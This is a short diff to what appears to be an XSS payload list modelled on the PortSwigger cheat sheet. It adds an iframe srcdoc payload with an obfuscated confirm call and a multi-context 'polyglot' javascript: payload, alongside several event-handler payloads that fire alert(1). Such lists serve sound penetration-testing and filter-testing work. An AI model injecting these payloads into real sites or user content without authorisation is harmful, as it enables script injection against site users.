@@ -1,5 +1,8 @@
-# https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+#### For Editor
+<iframe srcdoc="<details/open/ontoggle=confir\u006d(location.href) style=display:none></details>"></iframe>
+#### polyglot
 javascript:/*--></title></style></textarea></script></xmp><details/open/ontoggle='+/`/+/"/+/onmouseover=1/+/[*/[]/+confirm(/testStr/)//'>
+#### https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 <a autofocus onfocus=alert(1) href></a>
 <a autofocus onfocusin=alert(1) href></a>
 <a draggable="true" ondrag="alert(1)">test</a>
